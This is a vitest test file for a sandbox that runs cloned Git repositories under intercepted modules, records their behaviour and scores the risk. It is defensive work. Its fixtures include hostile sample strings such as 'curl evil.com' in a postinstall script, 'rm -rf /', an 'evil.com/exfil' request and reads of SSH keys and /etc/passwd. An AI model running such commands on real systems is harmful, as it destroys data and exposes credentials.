/**
 * Git Sandbox — Tests for Track I Phase 2 behavioral analysis.
 *
 * Validates:
 *   1. Entry point discovery from repo structure
 *   2. Temp directory preparation and cleanup
 *   3. Harness code generation (module interception)
 *   4. Observation parsing from JSONL stdout
 *   5. Behavioral analysis (summary extraction)
 *   6. Risk scoring from behavioral observations
 *   7. ScanReport merging (behavioral + static)
 *   8. Sandbox evasion detection
 *   9. Resource limit enforcement
 *  10. cLaw Gate: sandbox safety boundaries
 */

import { describe, it, expect, afterEach } from 'vitest';
import type { LoadedRepo, RepoFile, RepoTreeEntry } from '../../src/main/git-loader';
import type { ScanReport, ScanFinding } from '../../src/main/git-scanner';
import {
  discoverEntryPoints,
  prepareTempDir,
  cleanupTempDir,
  generateHarnessCode,
  parseObservations,
  analyzeObservations,
  scoreBehavior,
  mergeBehavioralProfile,
  type SandboxObservation,
  type BehavioralSummary,
  type BehavioralProfile,
  type ResourceUsage,
  type SandboxConfig,
} from '../../src/main/git-sandbox';
import * as fs from 'fs';
import * as path from 'path';

// ── Test Helpers ────────────────────────────────────────────────────

function makeFile(filePath: string, content: string, language = 'javascript'): RepoFile {
  return { path: filePath, content, language, size: content.length };
}

function makeTree(filePath: string, type: 'file' | 'directory' = 'file', size = 100): RepoTreeEntry {
  return { path: filePath, type, size };
}

function makeRepo(files: RepoFile[], tree?: RepoTreeEntry[]): LoadedRepo {
  return {
    id: 'test-repo',
    name: 'test-repo',
    owner: 'test',
    branch: 'main',
    description: 'Test repository',
    url: 'https://github.com/test/test-repo',
    localPath: '/tmp/test-repo',
    files,
    tree: tree || files.map(f => makeTree(f.path)),
    loadedAt: Date.now(),
    totalSize: files.reduce((s, f) => s + f.size, 0),
  };
}

function makeObservation(type: SandboxObservation['type'], detail: string, blocked = false, extra: Partial<SandboxObservation> = {}): SandboxObservation {
  return {
    timestamp: Date.now(),
    type,
    detail,
    blocked,
    ...extra,
  };
}

function makeScanReport(overrides: Partial<ScanReport> = {}): ScanReport {
  return {
    repoId: 'test-repo',
    repoUrl: 'https://github.com/test/test-repo',
    timestamp: Date.now(),
    durationMs: 100,
    riskLevel: 'low',
    riskScore: 5,
    findings: [],
    dependencies: { totalDependencies: 0, directDependencies: [], suspiciousPackages: [], installScripts: [], typosquatCandidates: [] },
    secrets: { potentialSecrets: 0, categories: {} },
    obfuscation: { evalCalls: 0, base64Patterns: 0, hexPatterns: 0, charCodePatterns: 0, minifiedFiles: [] },
    network: { uniqueUrls: [], uniqueIps: [], fetchCalls: 0, websocketRefs: 0 },
    promptInjection: { injectionAttempts: 0, patterns: [] },
    filesScanned: 5,
    totalSize: 1000,
    languages: { javascript: 5 },
    ...overrides,
  };
}

function makeProfile(overrides: Partial<BehavioralProfile> = {}): BehavioralProfile {
  return {
    runId: 'test-run',
    timestamp: Date.now(),
    durationMs: 100,
    entryPointsTested: ['index.js'],
    observations: [],
    summary: {
      filesAccessed: [],
      filesWritten: [],
      networkTargets: [],
      httpRequests: [],
      processesSpawned: [],
      envVarsAccessed: [],
      externalModules: [],
      osQueries: 0,
      blockedOperations: 0,
      evasionAttempted: false,
      evasionPatterns: [],
    },
    resources: {
      peakMemoryMB: 50,
      cpuTimeMs: 100,
      wallTimeMs: 100,
      exitCode: 0,
      killedByLimit: false,
    },
    riskContribution: 0,
    findings: [],
    sandboxIntegrity: 'intact',
    ...overrides,
  };
}

// Track temp dirs for cleanup
const tempDirs: string[] = [];
afterEach(() => {
  for (const dir of tempDirs) {
    cleanupTempDir(dir);
  }
  tempDirs.length = 0;
});

// ── Entry Point Discovery ────────────────────────────────────────────

describe('Git Sandbox — Entry Point Discovery', () => {
  it('should discover main field from package.json', () => {
    const repo = makeRepo([
      makeFile('package.json', JSON.stringify({ main: 'lib/index.js' })),
      makeFile('lib/index.js', 'module.exports = {};'),
    ]);
    const eps = discoverEntryPoints(repo);
    expect(eps).toContain('lib/index.js');
  });

  it('should discover bin entries from package.json', () => {
    const repo = makeRepo([
      makeFile('package.json', JSON.stringify({ bin: { cli: './bin/cli.js' } })),
      makeFile('bin/cli.js', '#!/usr/bin/env node'),
    ]);
    const eps = discoverEntryPoints(repo);
    expect(eps).toContain('./bin/cli.js');
  });

  it('should discover string bin from package.json', () => {
    const repo = makeRepo([
      makeFile('package.json', JSON.stringify({ bin: './cli.js' })),
      makeFile('cli.js', '#!/usr/bin/env node'),
    ]);
    const eps = discoverEntryPoints(repo);
    expect(eps).toContain('./cli.js');
  });

  it('should discover index.js fallback', () => {
    const repo = makeRepo([
      makeFile('index.js', 'console.log("hello");'),
    ]);
    const eps = discoverEntryPoints(repo);
    expect(eps).toContain('index.js');
  });

  it('should discover src/index.ts', () => {
    const repo = makeRepo([
      makeFile('src/index.ts', 'export default {};'),
    ]);
    const eps = discoverEntryPoints(repo);
    expect(eps).toContain('src/index.ts');
  });

  it('should discover setup/install scripts', () => {
    const repo = makeRepo([
      makeFile('scripts/postinstall.js', 'exec("curl evil.com");'),
      makeFile('index.js', 'module.exports = {};'),
    ]);
    const eps = discoverEntryPoints(repo);
    expect(eps).toContain('scripts/postinstall.js');
  });

  it('should cap at MAX_ENTRY_POINTS', () => {
    const files: RepoFile[] = [];
    for (let i = 0; i < 20; i++) {
      files.push(makeFile(`ep${i}/index.js`, `module.exports = ${i};`));
    }
    files.push(makeFile('package.json', JSON.stringify({
      main: 'ep0/index.js',
      bin: { a: 'ep1/index.js', b: 'ep2/index.js', c: 'ep3/index.js', d: 'ep4/index.js', e: 'ep5/index.js' }
    })));
    const eps = discoverEntryPoints(makeRepo(files));
    expect(eps.length).toBeLessThanOrEqual(5);
  });

  it('should handle malformed package.json gracefully', () => {
    const repo = makeRepo([
      makeFile('package.json', '{{{invalid json'),
      makeFile('index.js', 'module.exports = {};'),
    ]);
    const eps = discoverEntryPoints(repo);
    expect(eps).toContain('index.js');
  });

  it('should return empty for repos with no entry points', () => {
    const repo = makeRepo([
      makeFile('README.md', '# Hello', 'markdown'),
      makeFile('docs/guide.md', '# Guide', 'markdown'),
    ]);
    const eps = discoverEntryPoints(repo);
    expect(eps.length).toBe(0);
  });
});

// ── Temp Directory Management ────────────────────────────────────────

describe('Git Sandbox — Temp Directory', () => {
  it('should create temp dir with repo files', () => {
    const repo = makeRepo([
      makeFile('index.js', 'console.log("hello");'),
      makeFile('lib/utils.js', 'module.exports = {};'),
    ]);
    const dir = prepareTempDir(repo);
    tempDirs.push(dir);

    expect(fs.existsSync(dir)).toBe(true);
    expect(fs.existsSync(path.join(dir, 'index.js'))).toBe(true);
    expect(fs.existsSync(path.join(dir, 'lib', 'utils.js'))).toBe(true);
  });

  it('should only write code file extensions', () => {
    const repo = makeRepo([
      makeFile('index.js', 'console.log("hello");'),
      makeFile('data.csv', 'a,b,c', 'csv'),
      makeFile('image.png', 'binary-data', 'binary'),
      makeFile('config.json', '{"key": "value"}', 'json'),
    ]);
    const dir = prepareTempDir(repo);
    tempDirs.push(dir);

    expect(fs.existsSync(path.join(dir, 'index.js'))).toBe(true);
    expect(fs.existsSync(path.join(dir, 'config.json'))).toBe(true);
    expect(fs.existsSync(path.join(dir, 'data.csv'))).toBe(false);
    expect(fs.existsSync(path.join(dir, 'image.png'))).toBe(false);
  });

  it('should skip files larger than 512KB', () => {
    const bigContent = 'x'.repeat(600 * 1024);
    const repo = makeRepo([
      makeFile('index.js', 'console.log("hello");'),
      makeFile('big.js', bigContent),
    ]);
    const dir = prepareTempDir(repo);
    tempDirs.push(dir);

    expect(fs.existsSync(path.join(dir, 'index.js'))).toBe(true);
    expect(fs.existsSync(path.join(dir, 'big.js'))).toBe(false);
  });

  it('should clean up temp dir completely', () => {
    const repo = makeRepo([
      makeFile('index.js', 'console.log("hello");'),
      makeFile('lib/utils.js', 'module.exports = {};'),
    ]);
    const dir = prepareTempDir(repo);

    expect(fs.existsSync(dir)).toBe(true);
    cleanupTempDir(dir);
    expect(fs.existsSync(dir)).toBe(false);
  });

  it('should handle cleanup of non-existent dir gracefully', () => {
    expect(() => cleanupTempDir('/nonexistent/path/12345')).not.toThrow();
  });
});

// ── Harness Code Generation ──────────────────────────────────────────

describe('Git Sandbox — Harness Generation', () => {
  const defaultConfig: SandboxConfig = {
    timeoutMs: 15000,
    maxMemoryMB: 256,
    maxObservations: 1000,
    allowNetwork: false,
    allowExternalWrites: false,
    nodePath: process.execPath,
  };

  it('should generate valid JavaScript', () => {
    const code = generateHarnessCode(['index.js'], '/tmp/sandbox', defaultConfig);
    expect(code).toContain("'use strict'");
    // Should be parseable (basic syntax check)
    expect(() => new Function(code)).not.toThrow();
  });

  it('should intercept fs module', () => {
    const code = generateHarnessCode(['index.js'], '/tmp/sandbox', defaultConfig);
    expect(code).toContain('fsProxy');
    expect(code).toContain("id === 'fs'");
  });

  it('should intercept net and http modules', () => {
    const code = generateHarnessCode(['index.js'], '/tmp/sandbox', defaultConfig);
    expect(code).toContain('netProxy');
    expect(code).toContain('httpProxy');
    expect(code).toContain("id === 'net'");
    expect(code).toContain("id === 'http'");
  });

  it('should intercept child_process module', () => {
    const code = generateHarnessCode(['index.js'], '/tmp/sandbox', defaultConfig);
    expect(code).toContain('cpProxy');
    expect(code).toContain("id === 'child_process'");
  });

  it('should intercept os module', () => {
    const code = generateHarnessCode(['index.js'], '/tmp/sandbox', defaultConfig);
    expect(code).toContain('osProxy');
    expect(code).toContain("id === 'os'");
  });

  it('should strip sensitive env vars', () => {
    const code = generateHarnessCode(['index.js'], '/tmp/sandbox', defaultConfig);
    expect(code).toContain('OPENAI_API_KEY');
    expect(code).toContain('GITHUB_TOKEN');
    expect(code).toContain('AWS_ACCESS_KEY_ID');
  });

  it('should embed entry points', () => {
    const code = generateHarnessCode(['lib/main.js', 'cli.js'], '/tmp/sandbox', defaultConfig);
    expect(code).toContain('lib/main.js');
    expect(code).toContain('cli.js');
  });

  it('should include evasion detection', () => {
    const code = generateHarnessCode(['index.js'], '/tmp/sandbox', defaultConfig);
    expect(code).toContain('SANDBOX');
    expect(code).toContain('DOCKER');
    expect(code).toContain('evasion');
  });

  it('should sanitize os.hostname', () => {
    const code = generateHarnessCode(['index.js'], '/tmp/sandbox', defaultConfig);
    expect(code).toContain('sandbox-host');
  });

  it('should include JSONL reporting', () => {
    const code = generateHarnessCode(['index.js'], '/tmp/sandbox', defaultConfig);
    expect(code).toContain('JSON.stringify');
    expect(code).toContain('_sandbox');
    expect(code).toContain('_done');
  });
});

// ── Observation Parsing ──────────────────────────────────────────────

describe('Git Sandbox — Observation Parsing', () => {
  it('should parse valid JSONL observations', () => {
    const stdout = [
      JSON.stringify({ _sandbox: true, timestamp: 10, type: 'fs-read', detail: '/tmp/file.js', blocked: false }),
      JSON.stringify({ _sandbox: true, timestamp: 20, type: 'net-connect', detail: 'evil.com:443', blocked: true, target: 'evil.com:443' }),
      JSON.stringify({ _sandbox: true, _done: true, exitCode: 0, observations: 2, wallTimeMs: 100, memoryMB: 50 }),
    ].join('\n');

    const { observations, doneMessage } = parseObservations(stdout);
    expect(observations.length).toBe(2);
    expect(observations[0].type).toBe('fs-read');
    expect(observations[1].type).toBe('net-connect');
    expect(observations[1].blocked).toBe(true);
    expect(doneMessage).toBeDefined();
    expect(doneMessage!.exitCode).toBe(0);
    expect(doneMessage!.memoryMB).toBe(50);
  });

  it('should skip non-sandbox JSON lines', () => {
    const stdout = [
      JSON.stringify({ not_sandbox: true, data: 'hello' }),
      JSON.stringify({ _sandbox: true, timestamp: 10, type: 'fs-read', detail: 'test', blocked: false }),
    ].join('\n');

    const { observations } = parseObservations(stdout);
    expect(observations.length).toBe(1);
  });

  it('should handle non-JSON lines gracefully', () => {
    const stdout = [
      'console.log output from target code',
      'Warning: something went wrong',
      JSON.stringify({ _sandbox: true, timestamp: 10, type: 'module-load', detail: 'express', blocked: false }),
    ].join('\n');

    const { observations } = parseObservations(stdout);
    expect(observations.length).toBe(1);
    expect(observations[0].detail).toBe('express');
  });

  it('should handle empty stdout', () => {
    const { observations, doneMessage } = parseObservations('');
    expect(observations.length).toBe(0);
    expect(doneMessage).toBeUndefined();
  });

  it('should extract path from fs observations', () => {
    const stdout = JSON.stringify({
      _sandbox: true, timestamp: 10, type: 'fs-read',
      detail: '/home/user/.ssh/id_rsa', blocked: true,
      path: '/home/user/.ssh/id_rsa',
    });
    const { observations } = parseObservations(stdout);
    expect(observations[0].path).toBe('/home/user/.ssh/id_rsa');
  });

  it('should extract target from network observations', () => {
    const stdout = JSON.stringify({
      _sandbox: true, timestamp: 10, type: 'http-request',
      detail: 'https://evil.com/exfil', blocked: true,
      target: 'evil.com',
    });
    const { observations } = parseObservations(stdout);
    expect(observations[0].target).toBe('evil.com');
  });

  it('should extract command from process observations', () => {
    const stdout = JSON.stringify({
      _sandbox: true, timestamp: 10, type: 'process-spawn',
      detail: 'curl evil.com', blocked: true,
      command: 'curl evil.com',
    });
    const { observations } = parseObservations(stdout);
    expect(observations[0].command).toBe('curl evil.com');
  });
});

// ── Behavioral Analysis ──────────────────────────────────────────────

describe('Git Sandbox — Behavioral Analysis', () => {
  it('should aggregate file access observations', () => {
    const observations: SandboxObservation[] = [
      makeObservation('fs-read', '/tmp/sandbox/index.js', false, { path: '/tmp/sandbox/index.js' }),
      makeObservation('fs-read', '/tmp/sandbox/lib/utils.js', false, { path: '/tmp/sandbox/lib/utils.js' }),
      makeObservation('fs-write', '/tmp/sandbox/output.txt', false, { path: '/tmp/sandbox/output.txt' }),
    ];
    const summary = analyzeObservations(observations);
    expect(summary.filesAccessed.length).toBe(2);
    expect(summary.filesWritten.length).toBe(1);
  });

  it('should aggregate network observations', () => {
    const observations: SandboxObservation[] = [
      makeObservation('net-connect', 'evil.com:443', true, { target: 'evil.com:443' }),
      makeObservation('http-request', 'https://api.evil.com/data', true, { target: 'api.evil.com' }),
      makeObservation('net-dns', 'evil.com', true, { target: 'evil.com' }),
    ];
    const summary = analyzeObservations(observations);
    expect(summary.networkTargets.length).toBe(2); // evil.com:443 + dns:evil.com
    expect(summary.httpRequests.length).toBe(1);
  });

  it('should aggregate process spawn observations', () => {
    const observations: SandboxObservation[] = [
      makeObservation('process-spawn', 'curl evil.com', true, { command: 'curl evil.com' }),
      makeObservation('process-exec', 'rm -rf /', true, { command: 'rm -rf /' }),
    ];
    const summary = analyzeObservations(observations);
    expect(summary.processesSpawned.length).toBe(2);
  });

  it('should count blocked operations', () => {
    const observations: SandboxObservation[] = [
      makeObservation('fs-read', '/etc/passwd', true),
      makeObservation('net-connect', 'evil.com', true),
      makeObservation('process-spawn', 'rm -rf /', true),
      makeObservation('module-load', 'express', false),
    ];
    const summary = analyzeObservations(observations);
    expect(summary.blockedOperations).toBe(3);
  });

  it('should detect sandbox evasion via env checks', () => {
    const observations: SandboxObservation[] = [
      makeObservation('env-access', 'SANDBOX_DETECTED (evasion check)', false),
      makeObservation('env-access', 'CONTAINER_ID (evasion check)', false),
    ];
    const summary = analyzeObservations(observations);
    expect(summary.evasionAttempted).toBe(true);
    expect(summary.evasionPatterns.length).toBeGreaterThan(0);
  });

  it('should detect sandbox evasion via hostname check', () => {
    const observations: SandboxObservation[] = [
      makeObservation('os-info', 'hostname', false),
    ];
    const summary = analyzeObservations(observations);
    expect(summary.evasionPatterns).toContain('hostname-check');
  });

  it('should track external module loads', () => {
    const observations: SandboxObservation[] = [
      makeObservation('module-load', '_harness-start', false),
      makeObservation('module-load', 'express', false),
      makeObservation('module-load', 'lodash', false),
      makeObservation('module-load', './local-file', false),
    ];
    const summary = analyzeObservations(observations);
    expect(summary.externalModules).toContain('express');
    expect(summary.externalModules).toContain('lodash');
    expect(summary.externalModules).not.toContain('_harness-start');
    expect(summary.externalModules).not.toContain('./local-file');
  });

  it('should count OS info queries', () => {
    const observations: SandboxObservation[] = [
      makeObservation('os-info', 'platform', false),
      makeObservation('os-info', 'arch', false),
      makeObservation('os-info', 'cpus', false),
    ];
    const summary = analyzeObservations(observations);
    expect(summary.osQueries).toBe(3);
  });

  it('should handle empty observations', () => {
    const summary = analyzeObservations([]);
    expect(summary.filesAccessed.length).toBe(0);
    expect(summary.blockedOperations).toBe(0);
    expect(summary.evasionAttempted).toBe(false);
  });

  it('should cap array sizes to prevent memory issues', () => {
    const observations: SandboxObservation[] = [];
    for (let i = 0; i < 500; i++) {
      observations.push(makeObservation('fs-read', `/path/${i}`, false, { path: `/path/${i}` }));
    }
    const summary = analyzeObservations(observations);
    expect(summary.filesAccessed.length).toBeLessThanOrEqual(200);
  });
});

// ── Risk Scoring ─────────────────────────────────────────────────────

describe('Git Sandbox — Risk Scoring', () => {
  const defaultResources: ResourceUsage = {
    peakMemoryMB: 50,
    cpuTimeMs: 100,
    wallTimeMs: 200,
    exitCode: 0,
    killedByLimit: false,
  };

  it('should return 0 risk for benign behavior', () => {
    const summary: BehavioralSummary = {
      filesAccessed: ['/tmp/sandbox/index.js'],
      filesWritten: [],
      networkTargets: [],
      httpRequests: [],
      processesSpawned: [],
      envVarsAccessed: ['NODE_ENV'],
      externalModules: ['lodash'],
      osQueries: 0,
      blockedOperations: 0,
      evasionAttempted: false,
      evasionPatterns: [],
    };
    const { riskContribution, findings } = scoreBehavior(summary, defaultResources);
    expect(riskContribution).toBe(0);
    expect(findings.length).toBe(0);
  });

  it('should score network attempts', () => {
    const summary: BehavioralSummary = {
      filesAccessed: [],
      filesWritten: [],
      networkTargets: ['evil.com:443', 'malware.net:80'],
      httpRequests: ['https://evil.com/exfil'],
      processesSpawned: [],
      envVarsAccessed: [],
      externalModules: [],
      osQueries: 0,
      blockedOperations: 2,
      evasionAttempted: false,
      evasionPatterns: [],
    };
    const { riskContribution, findings } = scoreBehavior(summary, defaultResources);
    expect(riskContribution).toBeGreaterThan(0);
    expect(findings.some(f => f.title.includes('network'))).toBe(true);
  });

  it('should score process spawn attempts highly', () => {
    const summary: BehavioralSummary = {
      filesAccessed: [],
      filesWritten: [],
      networkTargets: [],
      httpRequests: [],
      processesSpawned: ['curl evil.com', 'rm -rf /'],
      envVarsAccessed: [],
      externalModules: [],
      osQueries: 0,
      blockedOperations: 2,
      evasionAttempted: false,
      evasionPatterns: [],
    };
    const { riskContribution, findings } = scoreBehavior(summary, defaultResources);
    expect(riskContribution).toBeGreaterThanOrEqual(15);
    expect(findings.some(f => f.severity === 'high')).toBe(true);
  });

  it('should score evasion behavior highly', () => {
    const summary: BehavioralSummary = {
      filesAccessed: [],
      filesWritten: [],
      networkTargets: [],
      httpRequests: [],
      processesSpawned: [],
      envVarsAccessed: [],
      externalModules: [],
      osQueries: 0,
      blockedOperations: 0,
      evasionAttempted: true,
      evasionPatterns: ['SANDBOX_CHECK', 'hostname-check'],
    };
    const { riskContribution, findings } = scoreBehavior(summary, defaultResources);
    expect(riskContribution).toBeGreaterThanOrEqual(15);
    expect(findings.some(f => f.title.includes('evasion'))).toBe(true);
  });

  it('should score resource exhaustion', () => {
    const resources: ResourceUsage = {
      peakMemoryMB: 256,
      cpuTimeMs: 15000,
      wallTimeMs: 15000,
      exitCode: null,
      killedByLimit: true,
      killReason: 'memory',
    };
    const summary: BehavioralSummary = {
      filesAccessed: [],
      filesWritten: [],
      networkTargets: [],
      httpRequests: [],
      processesSpawned: [],
      envVarsAccessed: [],
      externalModules: [],
      osQueries: 0,
      blockedOperations: 0,
      evasionAttempted: false,
      evasionPatterns: [],
    };
    const { riskContribution, findings } = scoreBehavior(summary, resources);
    expect(riskContribution).toBeGreaterThan(0);
    expect(findings.some(f => f.title.includes('Resource limit'))).toBe(true);
  });

  it('should score excessive env access', () => {
    const envVars: string[] = [];
    for (let i = 0; i < 50; i++) envVars.push(`VAR_${i}`);
    const summary: BehavioralSummary = {
      filesAccessed: [],
      filesWritten: [],
      networkTargets: [],
      httpRequests: [],
      processesSpawned: [],
      envVarsAccessed: envVars,
      externalModules: [],
      osQueries: 0,
      blockedOperations: 0,
      evasionAttempted: false,
      evasionPatterns: [],
    };
    const { riskContribution, findings } = scoreBehavior(summary, defaultResources);
    expect(riskContribution).toBeGreaterThan(0);
    expect(findings.some(f => f.title.includes('environment'))).toBe(true);
  });

  it('should cap risk contribution at 50', () => {
    const summary: BehavioralSummary = {
      filesAccessed: [],
      filesWritten: ['external/write1', 'external/write2'],
      networkTargets: Array(20).fill('evil.com'),
      httpRequests: Array(20).fill('https://evil.com'),
      processesSpawned: ['curl', 'rm', 'wget'],
      envVarsAccessed: Array(50).fill('VAR'),
      externalModules: [],
      osQueries: 10,
      blockedOperations: 100,
      evasionAttempted: true,
      evasionPatterns: ['SANDBOX', 'DOCKER'],
    };
    const resources: ResourceUsage = {
      ...defaultResources,
      killedByLimit: true,
      killReason: 'timeout',
    };
    const { riskContribution } = scoreBehavior(summary, resources);
    expect(riskContribution).toBeLessThanOrEqual(50);
  });

  it('should assign proper severity to findings', () => {
    const summary: BehavioralSummary = {
      filesAccessed: [],
      filesWritten: [],
      networkTargets: Array(5).fill('evil.com'),
      httpRequests: [],
      processesSpawned: ['rm -rf /'],
      envVarsAccessed: [],
      externalModules: [],
      osQueries: 0,
      blockedOperations: 5,
      evasionAttempted: false,
      evasionPatterns: [],
    };
    const { findings } = scoreBehavior(summary, defaultResources);
    // Network with 5 targets → high
    const netFinding = findings.find(f => f.title.includes('network'));
    expect(netFinding?.severity).toBe('high');
    // Process spawn → high
    const procFinding = findings.find(f => f.title.includes('process'));
    expect(procFinding?.severity).toBe('high');
  });
});

// ── ScanReport Merging ───────────────────────────────────────────────

describe('Git Sandbox — ScanReport Merging', () => {
  it('should merge findings from behavioral profile into scan report', () => {
    const report = makeScanReport({ findings: [
      { id: 'static-1', category: 'dependency', severity: 'low', title: 'Static finding', description: '', recommendation: '' },
    ]});
    const profile = makeProfile({
      findings: [
        { id: 'bh-1', category: 'network', severity: 'high', title: 'Behavioral finding', description: '', recommendation: '' },
      ],
      riskContribution: 10,
    });

    const merged = mergeBehavioralProfile(report, profile);
    expect(merged.findings.length).toBe(2);
    expect(merged.findings.some(f => f.id === 'static-1')).toBe(true);
    expect(merged.findings.some(f => f.id === 'bh-1')).toBe(true);
  });

  it('should add behavioral risk to static risk score', () => {
    const report = makeScanReport({ riskScore: 20, riskLevel: 'medium' });
    const profile = makeProfile({ riskContribution: 25 });

    const merged = mergeBehavioralProfile(report, profile);
    expect(merged.riskScore).toBe(45);
    expect(merged.riskLevel).toBe('high');
  });

  it('should cap combined risk at 100', () => {
    const report = makeScanReport({ riskScore: 80 });
    const profile = makeProfile({ riskContribution: 40 });

    const merged = mergeBehavioralProfile(report, profile);
    expect(merged.riskScore).toBe(100);
    expect(merged.riskLevel).toBe('critical');
  });

  it('should store behavioral summary in extensions', () => {
    const report = makeScanReport();
    const profile = makeProfile({
      runId: 'test-run-123',
      sandboxIntegrity: 'intact',
      entryPointsTested: ['index.js'],
    });

    const merged = mergeBehavioralProfile(report, profile);
    expect(merged.extensions).toBeDefined();
    const bh = merged.extensions!.behavioral as Record<string, unknown>;
    expect(bh.runId).toBe('test-run-123');
    expect(bh.sandboxIntegrity).toBe('intact');
    expect(bh.entryPointsTested).toEqual(['index.js']);
  });

  it('should update risk level correctly at each threshold', () => {
    // Low (< 15)
    const low = mergeBehavioralProfile(
      makeScanReport({ riskScore: 5 }),
      makeProfile({ riskContribution: 5 }),
    );
    expect(low.riskLevel).toBe('low');

    // Medium (15-39)
    const medium = mergeBehavioralProfile(
      makeScanReport({ riskScore: 10 }),
      makeProfile({ riskContribution: 10 }),
    );
    expect(medium.riskLevel).toBe('medium');

    // High (40-69)
    const high = mergeBehavioralProfile(
      makeScanReport({ riskScore: 30 }),
      makeProfile({ riskContribution: 20 }),
    );
    expect(high.riskLevel).toBe('high');

    // Critical (70+)
    const critical = mergeBehavioralProfile(
      makeScanReport({ riskScore: 50 }),
      makeProfile({ riskContribution: 30 }),
    );
    expect(critical.riskLevel).toBe('critical');
  });

  it('should preserve existing extensions', () => {
    const report = makeScanReport({ extensions: { phase1: { scanner: 'v1' } } });
    const profile = makeProfile();

    const merged = mergeBehavioralProfile(report, profile);
    expect((merged.extensions as Record<string, unknown>).phase1).toEqual({ scanner: 'v1' });
    expect((merged.extensions as Record<string, unknown>).behavioral).toBeDefined();
  });
});

// ── cLaw Gate: Sandbox Safety ────────────────────────────────────────

describe('Git Sandbox — cLaw Gate: Sandbox Safety', () => {
  it('harness should not contain user home directory', () => {
    const homeDir = process.env.HOME || process.env.USERPROFILE || '';
    const code = generateHarnessCode(['index.js'], '/tmp/safe-sandbox', {
      timeoutMs: 15000,
      maxMemoryMB: 256,
      maxObservations: 1000,
      allowNetwork: false,
      allowExternalWrites: false,
      nodePath: process.execPath,
    });
    if (homeDir) {
      expect(code).not.toContain(homeDir);
    }
  });

  it('harness should strip all sensitive env vars', () => {
    const code = generateHarnessCode(['index.js'], '/tmp/sandbox', {
      timeoutMs: 15000,
      maxMemoryMB: 256,
      maxObservations: 1000,
      allowNetwork: false,
      allowExternalWrites: false,
      nodePath: process.execPath,
    });
    // All sensitive vars should be in the strip list
    expect(code).toContain('OPENAI_API_KEY');
    expect(code).toContain('ANTHROPIC_API_KEY');
    expect(code).toContain('AWS_ACCESS_KEY_ID');
    expect(code).toContain('GITHUB_TOKEN');
    expect(code).toContain('STRIPE_SECRET_KEY');
    expect(code).toContain('DATABASE_URL');
  });

  it('observation analysis should not leak file contents', () => {
    const observations: SandboxObservation[] = [
      makeObservation('fs-read', '/tmp/sandbox/index.js', false, { path: '/tmp/sandbox/index.js' }),
    ];
    const summary = analyzeObservations(observations);
    const json = JSON.stringify(summary);
    // Should contain paths but not file contents
    expect(json).toContain('/tmp/sandbox/index.js');
    // No actual code content should appear
    expect(json).not.toContain('require');
    expect(json).not.toContain('module.exports');
  });

  it('findings should not contain raw secrets', () => {
    const summary: BehavioralSummary = {
      filesAccessed: [],
      filesWritten: [],
      networkTargets: ['evil.com:443'],
      httpRequests: [],
      processesSpawned: [],
      envVarsAccessed: ['AWS_SECRET_ACCESS_KEY'],
      externalModules: [],
      osQueries: 0,
      blockedOperations: 1,
      evasionAttempted: false,
      evasionPatterns: [],
    };
    const { findings } = scoreBehavior(summary, {
      peakMemoryMB: 50,
      cpuTimeMs: 100,
      wallTimeMs: 200,
      exitCode: 0,
      killedByLimit: false,
    });
    const json = JSON.stringify(findings);
    // Should not contain actual secret values
    expect(json).not.toMatch(/sk-[a-zA-Z0-9]{20,}/);
    expect(json).not.toMatch(/AKIA[A-Z0-9]{16}/);
  });

  it('behavioral profile should only contain metadata, no code', () => {
    const profile = makeProfile({
      observations: [
        makeObservation('module-load', 'express', false),
        makeObservation('fs-read', '/tmp/sandbox/index.js', false, { path: '/tmp/sandbox/index.js' }),
      ],
      summary: {
        filesAccessed: ['/tmp/sandbox/index.js'],
        filesWritten: [],
        networkTargets: [],
        httpRequests: [],
        processesSpawned: [],
        envVarsAccessed: [],
        externalModules: ['express'],
        osQueries: 0,
        blockedOperations: 0,
        evasionAttempted: false,
        evasionPatterns: [],
      },
    });
    const json = JSON.stringify(profile);
    // Profile should be behavioral metadata only
    expect(json).not.toContain('function');
    expect(json).not.toContain('require(');
    expect(json).not.toContain('import ');
  });

  it('risk contribution should always be 0-50 regardless of input', () => {
    // Even with extreme behavior
    const extremeSummary: BehavioralSummary = {
      filesAccessed: Array(500).fill('/path'),
      filesWritten: Array(500).fill('/write/path'),
      networkTargets: Array(500).fill('evil.com'),
      httpRequests: Array(500).fill('https://evil.com'),
      processesSpawned: Array(500).fill('rm -rf /'),
      envVarsAccessed: Array(500).fill('SECRET'),
      externalModules: Array(500).fill('module'),
      osQueries: 1000,
      blockedOperations: 5000,
      evasionAttempted: true,
      evasionPatterns: Array(100).fill('SANDBOX'),
    };
    const extremeResources: ResourceUsage = {
      peakMemoryMB: 10000,
      cpuTimeMs: 100000,
      wallTimeMs: 100000,
      exitCode: null,
      killedByLimit: true,
      killReason: 'memory',
    };
    const { riskContribution } = scoreBehavior(extremeSummary, extremeResources);
    expect(riskContribution).toBeGreaterThanOrEqual(0);
    expect(riskContribution).toBeLessThanOrEqual(50);
  });

  it('merged report should maintain valid structure', () => {
    const report = makeScanReport();
    const profile = makeProfile({
      findings: [
        { id: 'bh-1', category: 'network', severity: 'high', title: 'Test', description: '', recommendation: '' },
      ],
      riskContribution: 15,
    });
    const merged = mergeBehavioralProfile(report, profile);

    // Should have all required ScanReport fields
    expect(merged.repoId).toBeDefined();
    expect(merged.repoUrl).toBeDefined();
    expect(typeof merged.riskScore).toBe('number');
    expect(['low', 'medium', 'high', 'critical']).toContain(merged.riskLevel);
    expect(Array.isArray(merged.findings)).toBe(true);
    expect(merged.dependencies).toBeDefined();
    expect(merged.secrets).toBeDefined();
    expect(merged.obfuscation).toBeDefined();
    expect(merged.network).toBeDefined();
    expect(merged.promptInjection).toBeDefined();
  });

  it('temp dir names should be unpredictable (UUID-based)', () => {
    const repo = makeRepo([makeFile('index.js', 'console.log("test");')]);
    const dir1 = prepareTempDir(repo);
    const dir2 = prepareTempDir(repo);
    tempDirs.push(dir1, dir2);

    // Different UUIDs
    expect(dir1).not.toBe(dir2);
    // Should contain UUID segment
    expect(dir1).toMatch(/af-sandbox-[a-f0-9-]{12}/);
    expect(dir2).toMatch(/af-sandbox-[a-f0-9-]{12}/);
  });
});
